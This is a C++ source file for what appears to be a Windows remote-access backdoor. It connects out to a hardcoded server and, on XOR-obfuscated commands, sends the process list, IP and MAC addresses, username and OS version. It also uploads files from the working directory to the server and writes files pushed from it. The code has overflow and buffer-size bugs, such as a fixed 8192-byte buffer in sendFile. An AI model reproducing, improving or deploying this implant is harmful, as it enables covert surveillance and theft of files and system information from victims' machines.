#include "pch.h"
#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <urlmon.h>
#include <sstream>
#include <iomanip>
#include <comdef.h>
#include <winsock2.h>
#include <iphlpapi.h>
#include <mswsock.h>
#include <fstream>
#include <sstream>
#include <cstdint>
#include <vector>
#include <windows.h>
#include <Lmcons.h>
#include <stdio.h>
#include <VersionHelpers.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "mswsock.lib")
#pragma warning(disable : 4996)

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

using namespace std;

// Declarations 
BOOL GetProcessList(SOCKET sock);
void printError(TCHAR* msg);
std::string format_error(unsigned __int32 hr);
const char* getIPAddr();
void sendFile(SOCKET sock, const char* fileName);
static void GetMACaddress(void);
void PrintMACaddress(BYTE *addr);
char* getMAC();
void print_os_info();
string encryptDecrypt(string toEncrypt);

int main()
{
	string ipAddress = "192.168.1.2";
	int port = 54000;
	
	// Initalize WinSock

	WSADATA data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0)
	{
		std::cerr << "cant start winsock, err #" << wsResult << std::endl;
		return 0;
	}

	// Create Socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET)
	{
		cerr << "Can't create socket, Err # " << WSAGetLastError() << std::endl; 
		return 0;
	}


	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);




	// Connect to server
	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR)
	{
		std::cerr << "Can't connect to server, Err # " << WSAGetLastError() << std::endl;
		closesocket(sock);
		WSACleanup();
		return 0 ;
	}

	// Do-while loop to send and recieve data
	
	char buf[4096];
	char buff[4096];

	while (true)
	{
		ZeroMemory(buf, 4096);

		int bytesReceived = recv(sock, buf, 4096, 0);

		if (bytesReceived == SOCKET_ERROR)
		{
			std::cerr << "Error in recv(). Quitting" << std::endl;
			break;
		}

		if (bytesReceived == 0)
		{
			std::cout << "Client disconnected" << std::endl;
			break;
		}

		//std::cout << std::string(buf, 0, bytesReceived) << std::endl;
		
		char* response = new char[4096];
		int sizeOfResp = 0;

		string recString = encryptDecrypt(string(buf, 0, bytesReceived));

		if (recString.compare("ProcessList") == 0)
		{
			
			GetProcessList(sock);

			
			string encryptedDone = encryptDecrypt("DONE");
			send(sock, encryptedDone.c_str(), 4096, 0);


		}
		else if (recString.compare("MachineConfig") == 0)
		{

			const char* IPAddr = getIPAddr();

			size_t temp = 4096;
			response = strncpy(response, IPAddr, temp);
			sizeOfResp = sizeof(response) + 1;
			string encryptedIP = encryptDecrypt(response);
			send(sock, encryptedIP.c_str(), 4096, 0);

			//------------------------------------------


			char* pMac = getMAC();
			string encryptedMAC = encryptDecrypt(pMac);
			send(sock, encryptedMAC.c_str(), 4096, 0);

			//------------------------------------------

			TCHAR username[UNLEN + 1];
			DWORD username_len = UNLEN + 1; 
			GetUserName((TCHAR*)username, &username_len);

			_bstr_t b(username);
			const char* c = b;

			//wcout << c << endl;
			string encryptedUsername = encryptDecrypt(c);
			send(sock, encryptedUsername.c_str(), UNLEN + 1, 0);

			//------------------------------------------

			OSVERSIONINFOEX info;
			ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
			info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
			GetVersionEx((LPOSVERSIONINFO)& info);

			char major[5];
			char minor[5];
			char build[15];
			string os; 

			sprintf(major, "%d", info.dwMajorVersion);
			sprintf(minor, "%d", info.dwMinorVersion);
			sprintf(build, "%d", info.dwBuildNumber);
			
			os.append(major);
			os.append(".");
			os.append(minor);
			os.append(".");
			os.append(build);

			//cout << os << endl;

			string tempOS = encryptDecrypt(os);

			send(sock, tempOS.c_str(), 25, 0);
			

		}
		else if (recString.compare("Download") == 0)
		{

			ZeroMemory(buf, 256);
			int bytesRecieved = recv(sock, buf, 256, 0);

			char direct[256];
			GetCurrentDirectoryA(256, direct);

			string path = string(direct);
			string file = string(buf);

			path.append("\\");
			path.append(file);

			sendFile(sock, path.c_str());

		
		}
		else if (recString.compare("Upload") == 0)
		{

			ZeroMemory(buf, 256);
			int bytesRecieved = recv(sock, buf, 256, 0);
			string fileName = string(buf);

			char direct[256];
			GetCurrentDirectoryA(256, direct);

			string path = string(direct);

			path.append("\\");
			path.append(fileName);

			//cout << path << endl;

			FILE *file;
			file = fopen(path.c_str(), "wb");

			ZeroMemory(buf, 4096);
			bytesRecieved = recv(sock, buf, 4096, 0);
			if (bytesRecieved > 0) {

				ZeroMemory(buff, 4096);
				char key = 'K';

				for (int i = 0; i < sizeof(buf); i++)
				{
					
					buff[i] = buf[i] ^ key;	
				}

				fwrite(buff, 1, bytesRecieved, file);
				fclose(file);
			}


		}
		else 
		{
			size_t temp = 4096;
			response = strncpy(response, "Command4 Recieved! Capt'n", temp);
			sizeOfResp = sizeof(response) + 1;
			send(sock, response, 4096, 0);
		}
		


	}


	// Gracefully close down everything

	closesocket(sock);
	WSACleanup();
}


std::string format_error(unsigned __int32 hr)
{
	std::stringstream ss;
	ss << "Failed to Initialize COM. Error code = 0x" << std::hex << hr << std::endl;
	return ss.str();
}

BOOL GetProcessList(SOCKET sock)
{
	HANDLE hProcessSnap;
	//HANDLE hProcess;
	PROCESSENTRY32 pe32;
	//DWORD dwPriorityClass;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		printError((TCHAR*)("CreateToolhelp32Snapshot (of processes)"));
		return(FALSE);
	}

	// Set the size of the structure before using it.
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		printError((TCHAR*)("Process32First")); // show cause of failure
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return(FALSE);
	}

	// Now walk the snapshot of processes, and
	// display information about each process in turn

	const char** arr = new const char*[45];
	int i = 0;
	do
	{
		//_tprintf(TEXT("\nPROCESS NAME:  %s"), pe32.szExeFile);
		_bstr_t b(pe32.szExeFile);
		const char* c = b;

		string encryptedProc = encryptDecrypt(c);

		send(sock, encryptedProc.c_str(), 261, 0);
		Sleep(100);

	} while (Process32Next(hProcessSnap, &pe32));


	CloseHandle(hProcessSnap);
	return(TRUE);
}


void printError(TCHAR* msg)
{
	DWORD eNum;
	TCHAR sysMsg[256];
	TCHAR* p;

	eNum = GetLastError();
	FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, eNum,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
		sysMsg, 256, NULL);

	// Trim the end of the line and terminate it with a null
	p = sysMsg;
	while ((*p > 31) || (*p == 9))
		++p;
	do { *p-- = 0; } while ((p >= sysMsg) &&
		((*p == '.') || (*p < 33)));

	// Display the message
	_tprintf(TEXT("\n  WARNING: %s failed with error %d (%s)"), msg, eNum, sysMsg);
}


const char* getIPAddr()
{

	//int i;

	PMIB_IPADDRTABLE pIPAddrTable;
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	IN_ADDR IPAddr;

	LPVOID lpMsgBuf;

	pIPAddrTable = (MIB_IPADDRTABLE *)MALLOC(sizeof(MIB_IPADDRTABLE));

	if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) ==
		ERROR_INSUFFICIENT_BUFFER) {
		FREE(pIPAddrTable);
		pIPAddrTable = (MIB_IPADDRTABLE *)MALLOC(dwSize);
	}

	if (pIPAddrTable == NULL) {
		printf("Memory error");
		exit(1);
	}

	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR) {
		printf("GetIpAddrTable failed with error %d\n", dwRetVal);
		if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, dwRetVal, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),      
			(LPTSTR) & lpMsgBuf, 0, NULL)) {
			printf("\tError: %s", lpMsgBuf);
			LocalFree(lpMsgBuf);
		}
		exit(1);
	}

	//printf("\tNum Entries: %ld\n", pIPAddrTable->dwNumEntries);
	//for (i = 0; i < (int) pIPAddrTable->dwNumEntries; i++) {
	IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[0].dwAddr;
	
	//printf("\tIP Address[%d]:     \t%s\n", 0, inet_ntoa(IPAddr));
	//}

	if (pIPAddrTable) {
		FREE(pIPAddrTable);
		pIPAddrTable = NULL;
	}

	return inet_ntoa(IPAddr);

}


void sendFile(SOCKET sock, const char* fileName)
{

	FILE* file;
	char* buffer;
	long int filelen;
	char buff[8192];

	file = fopen(fileName, "rb");
	fseek(file, 0, SEEK_END);
	filelen = ftell(file);
	rewind(file);

	buffer = (char*)malloc((filelen + 1) * sizeof(char));
	fread(buffer, filelen, 1, file);
	fclose(file);

	ZeroMemory(buff, 8192);
	char key = 'K';

	cout << filelen << endl;

	for (int i = 0; i < filelen; i++)
	{

		buff[i] = buffer[i] ^ key;

		//Sleep(1);
		//printf("");

	}

	send(sock, buff, filelen, 0);


}


void PrintMACaddress(BYTE *addr)
{
	for (int i = 0; i < 8; i++)
	{
		printf("%x ", *addr++);
	}
}


static void GetMACaddress(void)
{
	IP_ADAPTER_INFO AdapterInfo[16];       // Allocate information for up to 16 NICs
	DWORD dwBufLen = sizeof(AdapterInfo);  // Save memory size of buffer

	DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);                  // [in] size of receive data buffer
	if (dwStatus != ERROR_SUCCESS)
	{
		printf("GetAdaptersInfo failed. err=%d\n", GetLastError());
		return;
	}

	PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo; // Contains pointer to  current adapter info
	do
	{
		PrintMACaddress(pAdapterInfo->Address); // Print MAC address
		pAdapterInfo = pAdapterInfo->Next;    // Progress through linked list
	} while (pAdapterInfo);                    // Terminate if last adapter
}


char* getMAC() {
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
	char *mac_addr = (char*)malloc(18);

	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (AdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		free(mac_addr);
		return NULL; // it is safe to call free(NULL)
	}

	// Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(AdapterInfo);
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
		if (AdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			free(mac_addr);
			return NULL;
		}
	}

	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR)
	{
		// Contains pointer to current adapter info
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		//do {
			// technically should look at pAdapterInfo->AddressLength
			//   and not assume it is 6.
			sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			//printf("Address: %s, mac: %s\n", pAdapterInfo->IpAddressList.IpAddress.String, mac_addr);
			// print them all, return the last one.
			// return mac_addr;

			printf("\n");
		//	pAdapterInfo = pAdapterInfo->Next;
		//} while (pAdapterInfo);
	}
	free(AdapterInfo);
	return mac_addr; // caller must free.
}

void print_os_info()
{
	OSVERSIONINFOEX info;
	ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
	info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((LPOSVERSIONINFO)&info); 

	printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
}

string encryptDecrypt(string toEncrypt) {
	char key = 'K'; //Any char will work
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ key;

	return output;
}